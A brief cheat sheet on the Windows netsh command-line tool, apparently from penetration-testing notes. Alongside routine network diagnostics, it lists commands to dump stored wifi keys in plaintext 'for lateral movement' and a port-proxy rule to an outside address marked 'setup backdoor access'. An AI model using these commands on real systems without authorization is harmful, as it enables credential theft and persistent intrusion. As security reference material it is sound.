Short for Network Shell, netsh is a command line tool used in Windows to view, configure, and troubleshoot network settings.

```shell
# Useful commands:

netsh interface ip show config # Like `ipconfig /all` or `ip a`

netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear
# Extracts stored wifi profiles and plaintext keys, Good for lateral movement

netsh interface show interface # Show interfaces, identify VPNs, and other things.

netsh advfirewall firewall show rule name=all # List firewall rules, including those that may expose services or backdoors

netsh interface portproxy add v4tov4 listenport=80 listenaddress=127.0.0.1 connectport=4444 connectaddress=192.168.1.100
# setup backdoor access

```